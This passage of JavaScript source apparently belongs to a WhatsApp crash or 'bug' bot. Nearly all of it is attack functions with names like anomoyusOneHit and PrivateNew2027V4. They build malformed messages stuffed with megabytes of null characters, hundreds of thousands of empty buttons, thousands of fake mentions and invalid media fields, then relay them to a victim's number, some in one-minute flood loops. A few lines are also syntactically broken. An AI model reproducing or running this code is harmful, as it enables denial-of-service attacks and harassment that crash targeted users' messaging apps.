            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `LexzyModss - Executed`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "LexzyModss - Executed",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQJp84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "LexzyModss - Executed",
                                fileName: "NanasMuda - Executed",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{".repeat(9000)
                    }
                }
            }
        }
    };

    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { participant: { target } });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0000".repeat(9000),
                    contextInfo: {
                        participant: target,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { participant: { target } });

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                            mimetype: "image/jpeg",
                            caption: "LexzyMods - Iniochamy¿!",
                            fileSha256: "c9qyQBuWwI4bHiQX0TAmAq9V18JugSHKjal8BSOUVFY=",
                            fileLength: "634893",
                            height: 1022,
                            width: 1080,
                            mediaKey: "G6gr2DHkMBdjuZgWcc2zWMS1NGxY2VboQhxCG1f9GFA=",
                            fileEncSha256: "PT14PXdJ92cCsZv9+U0ELlkX7jeFVzjUwcIb7Xn0+0A=",
                            directPath: "/o1/v/t24/f2/m234/AQNKGomvjg2Ua9Ssb7JYtGlIOzdTlA__XPLpMZKSvoxo4s0BNq8_yoFgyopdfQCKdG2jhRfR1vVszLR_YOXUzxOlIoMwjA9bjsibM-7Xjg",
                            mediaKeyTimestamp: "1782643133",
                            jpegThumbnail: "/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wAARCAAeACADASIAAhEBAxEB/8QAGgAAAgIDAAAAAAAAAAAAAAAAAAQCBQEDBv/EACcQAAEDAwMDBAMAAAAAAAAAAAECAwQFERIFITEGE0EUIkFRcWGR/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/EABQRAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhEDEQA/AOErFPRNNXMaaLS09Rx1SAFGwASkKJpkenpmeKi0Bfchd9vf48fNBUUVcO6Gcy0w+lbqAOolYxAJFwEnzff6rXM0ORFidyXGloSP2xVwb2IHvagTjzpMZGDLykJyysLc8VIajMHElzZOPPi+VvvelaKB38vPxx7ty2ONr+Kg/qUyS2pt6QtaFWuD/KVooP/Z",
                            hasMediaAttachment: true
                        }
                    },
                    body: {
                        text: "\u0000",
                    },
                    nativeFlowMessage: {
                        buttons: "]".repeat(9000),
                    }
                }
            }
        }
    }, { participant: { target } });

    const startTime = Date.now();
    const duration = 1 * 60 * 1000;
    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "iniochamy - Executed¿!"
                        },
                        nativeFlowMessage: {
                            buttons: Array.from({ length: 500000 }, () => ({}))
                        },
                    },
                },
            },
        }, { participant: { target } });
    }
}

async function stardustdelay16(sock, target) {
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "stardust_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "forward_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ini stardust" + "𑇂𑆵𑆴𑆿".repeat(99999),
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"StardustConstruction","landmark_area":"X","address":"xxx","tower_number":"stardust","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"StardustHere | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }

async function anomoyusOneHit(sock, target) {
  const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

  const listPayload = {
    listMessage: {
      title: '⿻',
      description: 'ꪶ𖣂ꫂ 𝐓𝐇𝐄 𝐀𝐍𝐎𝐌𝐎𝐘𝐔𝐒 𝐒𝟐 – 𝐀𝐓𝐓𝐀𝐂𝐊 𖤐',
      buttonText: '\0'.repeat(50000),
      listType: 2,
      sections: [{
        title: 'X',
        rows: [{ title: 'X', description: '', rowId: '\n' }]
      }],
      productListInfo: {
        productSections: [{
          title: 'TheAnomoyusS2!',
          products: Array.from({ length: 2000000 }, () => ({
            productId: "ြ".repeat(50000)
          }))
        }],
        headerImage: {
          productId: "\n".repeat(5000) + "\u0000".repeat(10000),
          jpegThumbnail: null
        },
        businessOwnerJid: jid
      },
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        remoteJid: 'status@broadcast'
      }
    }
  };

  const invisibleOpts = { noSelfSync: true };

  await sock.relayMessage(jid, listPayload, invisibleOpts);

  await sock.relayMessage(jid, {
    groupStatusMessageV2: {
      message: {
        ...listPayload,
        messageContextInfo: {
          deviceListMetadataVersion: 2,
          deviceListMetadata: {}
        }
      }
    }
  }, invisibleOpts);

  await sock.relayMessage(jid, {
    statusMentionMessage: {
      message: { ...listPayload }
    }
  }, invisibleOpts);

  await sock.relayMessage(jid, {
    extendedTextMessage: {
      contacts: {
        displayName: "@RenaOffc",
        contacts: [{
          vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:@RenaOffc\nTEL;type=CELL;type=VOICE;waid=000000:+00000000\nEND:VCARD"
        }]
      },
      contextInfo: {
        mentionedJid: Array.from({ length: 1900 }, () =>
          "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        isForwarded: true,
        forwardingScore: 9999,
        forwardedAiBotMessageInfo: { botJid: "0@bot" }
      }
    },
    richResponseMessage: {
      messageType: 2,
      submessages: [
        {
          messageType: 8,
          mapAnnotation: {
            body: { title: "\\p" + "\n".repeat(4500000) }
          }
        },
        {
          liveLocationMessage: {
            degreesLatitude: -6.2,
            degreesLongitude: 106.816666,
            caption: "",
            sequenceNumber: 0,
            timeOffset: 0
          }
        }
      ]
    }
  }, invisibleOpts);
}

async function ButtonArray(sock, target) {
    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "( # )"
                    },
                    header: {
                        hasMediaAttachment: true,
                        locationMessage: {
                            degreesLatitude: 1111.111,
                            degreesLongitude: -128.1919,
                            name: "\u900A" + "\u0000".repeat(5000) + "\x10".repeat(2000),
                            address: "\u0007".repeat(20000) + "\x10".repeat(5000) + "\x10".repeat(1000)
                        }
                    },
                    contextInfo: {
                        mentionedJid: [
                            target,
                            "1@s.whatsapp.net",
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 5000 }, () =>
                                `${Math.floor(1000000 + Math.random() * 9999)}@s.whatsapp.net`
                            )
                        ]
                    },
                    nativeFlowMessage: {
                        buttons: "\0".repeat(500000)
                    }
                }
            }
        }
    }, {
        participant: target
    });
}

async function fefekpink(sock, target) {
  const x1 = "ꦾ".repeat(9999);
  const x2 = "ꦾ".repeat(99999); 

  const displayText = `\u200Bြ${x1}${x2}`;

  const buttonParams = {
    display_text: displayText,
    amount: "1000000 IDR"
  };

  const msg = {
    interactiveMessage: {
      body: { text: "PONZA ATTACK ON " },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_status",
            buttonParamsJson: JSON.stringify(buttonParams)
          }
        ]
      }
    }
  };
  
  const memeklu1 = {
    groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "-x" + "\0".repeat(25000)
                    },
                     nativeFlowmessage: {
                         buttons: "\x10". repeat(3000)
                     }
                }
            }
        }
    };
         const y = {
            groupStatusMessageV2: {
               message: {
                 interactiveMessage: {
                      body: {
                         text: "y" + "\n".repeat(5000)
                     },
                      nativeFlowMessage: {
                          buttons: Array.from({ length: 500000 }, () => ({}))
                      }
                 }
             }
         }
     };
        const z = {
          groupStatusMessageV2: {
              message: {
                  extendedTextMessage: {
                      text: "Ponza",
                       contextInfo: {
                          mentionedJid: Array.from({    length: 2000 }, () =>
    Math.floor(Math.random() * 700000) + "@s.whatsapp.net"
                       )
                   }
                }
            }
        }
    };
      await sock.relayMessage(target, msg, {})
      await sock.relayMessage(target, memeklu1, {})
      await sock.relayMessage(target, y, {})
      await sock.relayMessage(target, z, {
      });
       participant: {
          true
     }
}

async function hahahayuu(sock, target) {
  const memeksatu1 = {
    interactiveMessage: {
            body: {
                text: "x"
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 500000 }, () => ({
                    buttonId: "\u0000".repeat(1000),
                    buttonText: {
                        displayText: "𝕨𝕠𝕚 𝕦𝕥𝕒𝕟𝕘 𝕝𝕦 𝕞𝕒𝕟𝕒" + "\0" + "\x10".repeat(1000)
                    }
                })),
                messageParamsJson: '{}'
            },
            contextInfo: {
                forwardingScore: 99999,
                isForwarded: true,
                forwardedAiBotMessageInfo: {
                    botJid: "867051314767696@bot",
                    metionedJid: "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 })
                },
                forwardOrigin: 4
            }
        }
    };
    
    const memekdua2 = {
    locationMessage: {
        degreesLatitude: 999999.999,
        degreesLongitude: 999999.999,
        accuracyInMeters: 999999,
        speedInMps: 999999,
        degreesClockwiseFromMagneticNorth: 999999,
        comment: "\0".repeat(100000),
        address: "\u200b".repeat(100000),
        name: "\0".repeat(100000),
        jpegThumbnail: Buffer.alloc(1000000, 0xFF),
        contextInfo: {
            forwardingScore: 1,
            isForwarded: true,
            mentionedJid: Array.from({ length: 50000 }, () => "0@s.whatsapp.net"),
            participant: "\0".repeat(50000)
        }
    }
};

const x1 = "ꦾ".repeat(9999);
  const x2 = "ꦾ".repeat(99999); 

  const displayText = `\u200Bြ${x1}${x2}`;

  const buttonParams = {
    display_text: displayText,
    amount: "1000000 IDR"
  };

  const msg = {
    interactiveMessage: {
      body: { text: "INI ABILZY BRAY" },
      nativeFlowMessage: {
        buttons: [
          {
            name: "booking_status",
            buttonParamsJson: JSON.stringify(buttonParams)
          }
        ]
      }
    }
  };
  
  try {
    await sock.relayMessage(target, memeksatu1, memekdua2, msg, { Participant: true });
  } catch (error) {
    console.error("Gagal mengirim pesan:", error);
  }
}

async function PrivateNew2027V4(sock, target) {
  const largeThumbnail = Buffer.alloc(500_500, 'A').toString('base64');
  const generateId = () => Math.random().toString(36).substring(2, 15);

  const generateWAMessageFromContent = (jid, message, options = {}) => {
    return {
      key: {
        remoteJid: jid,
        fromMe: true,
        id: generateId()
      },
      message: message,
      messageTimestamp: Date.now(),
      pushName: "LexzyMods"
    };
  };

  const LexMsg = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
              fileLength: 9999,
              height: 9999,
              width: 9999,
              mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
              fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
              directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1776937541",
              jpegThumbnail: null,
              caption: "LexzyMods - Executed¿!",
              scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
              scanLengths: [
                9999999999999999999,
                9999999999999999999,
                9999999999999999999,
                9999999999999999999
              ],
              midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
            }
          },
          body: {
            text: "Iniochamy - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexca = generateWAMessageFromContent(target, LexMsg, {});

  await sock.relayMessage(target, Lexca.message, {
    participant: true,
    messageId: Lexca.key.id
  });

  const Lexcaa = {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          body: {
            text: "Lexcaabos - Executed¿!"
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 500000 }, () => ({}))
          }
        }
      }
    }
  };

  const Lexcaabos = generateWAMessageFromContent(target, Lexcaa, {});

  await sock.relayMessage(target, Lexcaabos.message, {
    participant: true,
    messageId: Lexcaabos.key.id
  });

  const msg = {
    key: { remoteJid: "status@broadcast", fromMe: true, id: generateId() },
    message: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        caption: "iniochamy¿!",
        fileSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        fileLength: 9999999,
        height: 9999,
        width: 9999,
        mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
        fileEncSha256: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
        directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1776937541",
        jpegThumbnail: largeThumbnail,
        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
        scanLengths: [
          2899999999999999077,
          1799999999999998555,
          7699999999999999148,
          1069999999999999164
        ],
        midQualityFileSha256: "Gt6RODauIu1fIwGhRg1TeEIkeguwn+ylFauogg+pQOk=",
        contextInfo: {
          pairedMediaType: "RICH_TEXT_MESSAGE",
          isQuestion: true,
          isGroupStatus: false,
          remoteJid: "1234567890-987654321@g.us",
          entryPointConversionDelaySeconds: 120,
          entryPointConversionSource: "group_chat"
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg.message, {
    statusJidList: [target],
    messageId: msg.key.id,
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{
          tag: "to",
          attrs: { jid: target },
          content: undefined
        }]
      }]
    }]
  });

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        },
        additionalNodes: [{
          tag: "meta",
          attrs: { is_status_mention: "false" },
          content: undefined
        }]
      }
    }
  }, {});

  await sock.relayMessage(target, {
    statusMentionMessage: {
      message: {
        protocolMessage: {
          key: msg.key,
          type: 25
        }
      }
    }
  }, {});

  const a = {
    interactiveMessage: {
      header: {
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgARQMBIgACEQEDEQH/xAAtAAEAAwEBAAAAAAAAAAAAAAAAAQQFBgIBAQEBAAAAAAAAAAAAAAAAAAABAv/aAAwDAQACEAMQAAAA5kE3aIuxTAAAE7mf2xg4/ZZZyiYAAL3UcZ0M1p505aZsFgACxXGln+QAAAAAAB//xAAkEAACAgIBBAEFAAAAAAAAAAABAgADBBExBRMgIhASMDJAcf/aAAgBAQABPwD4HI3O9Q35JO7Rxo6lltBr0qnf3wNnUxuks6B3jdMrA4mViNR/PLAQWZVYMLBdDYlzBRMtBZQ8Pj046y652Vstsdt7UjUzFLgCfSKsWw7h58a3Nbqw5BleXYxays+pHtLstiuww3L7WWoqW2zedGS9BOuDyJZmoy+tYDRmLHZ/W//EABQRAQAAAAAAAAAAAAAAAAAAAED/2gAIAQIBAT8AT//EABcRAAMBAAAAAAAAAAAAAAAAAAAwQQH/2gAIAQMBAT8AXlI3/9k=",
        hasMediaAttachment: true
      },
      body: {},
      nativeFlowMessage: {
        buttons: [
          {
            name: "order_status",
            buttonParamsJson: `{
  \"currency\":\"IDR\",
  \"total_amount\":{\"value\":0,\"offset\":100},
  \"reference_id\":\"${"NanasPrivate" + "ြ".repeat(75000)}\",
  \"type\":\"physical-goods\",
  \"order\":{
    \"status\":\"pending\",
    \"order_type\":\"PAYMENT_REQUEST\",
    \"items\":[
      {
        \"name\":\"${"LexzyMods" + "ြ".repeat(75000)}\",
        \"quantity\":-9,
        \"price\":{\"value\":0,\"offset\":100}
      }
    ]
  }
}`
          }
        ],
        messageParamsJson: ""
      },
      contextInfo: {
        forwardingScore: 9999,
        isForwarded: true,
        pairedMediaType: "NOT_PAIRED_MEDIA"
      }
    }
  };

  await sock.relayMessage(target, a, {});

  const b = {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(75000),
      publisher: "iniochamy - Executed¿!" + "ꦾ".repeat(5000),
      stickers: [],
      fileLength: "366299919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135555555@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 999999999,
      thumbnailWidth: 9999999999,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "9990099",
      stickerPackOrigin: "USER_CREATED"
    }
  };

  await sock.relayMessage(target, b, {});

  const c = {
    ephemeralMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "Students Func Nanas",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.9999999999999,
              name: "LexzyMods",
              address: "X",
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: {
            text: "LexzyMods - Executed¿!",
          },
          nativeFlowMessage: {
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "address_message",
                buttonParamsJson: "ြ ".repeat(9000),
              },
              {
                name: "galaxy_message",
                buttonParamsJson: "ြ ".repeat(75000),
              },
            ],
            messageParamsJson: "wa.me/stickerpack/LexzyMods",
            messageVersion: 1,
          },
        },
      },
    },
  };

  await sock.relayMessage(target, c, {});

  const d = {
    groupStatusMessageV2: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0&mms3=true",
          mimetype: "video/mp4",
          caption: "LexzyMods - Executed¿!",
          fileSha256: "LdNOQNcNIvlIijHvkpwRIY/zIoTfWQoFux7dzTHusyM=",
          fileLength: "1099511627776",
          seconds: 172800,
          mediaKey: "G2MGbP7BZLi1RwpyyV4DeXtfttaclMVSKfqNldZDt20=",
          height: 1080,
          width: 1920,
          fileEncSha256: "U4uKZrZeJpg8smAcMRT3qtPoviAp/dqGa63GzqYcS8E=",
          directPath: "/v/t62.7161-24/609348532_2813167542392969_465741537439148405_n.enc?ccb=11-4&oh=01_Q5Aa4AGN8v9HYNPCRbPeMILfoQ7MIqSvhY-gd7wr6YvDHhHSwA&oe=69EB192E&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1774428565",
